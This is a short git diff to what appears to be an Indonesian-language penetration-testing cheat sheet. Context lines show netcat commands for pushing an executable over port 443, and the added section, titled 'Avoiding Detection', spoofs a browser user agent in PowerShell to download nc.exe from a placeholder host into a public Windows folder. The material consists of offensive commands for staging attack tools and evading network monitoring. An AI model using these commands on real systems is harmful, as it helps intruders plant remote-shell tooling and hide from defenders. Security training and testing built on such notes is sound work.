@@ -339,3 +339,15 @@ sudo ncat -l -p 443 --send-only < batagor.exe
 nc <ip> 443 > batagor.exe
 ncat <ip> 443 --recv-only > batagor.exe
 ```
+
+<h2 align="center">Menghindari Deteksi</h2>
+
+```
+## GANTI USER AGENT
+# list user agent yg ada di windows
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+# dari list yg ada, pake salah 1
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<ip>/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
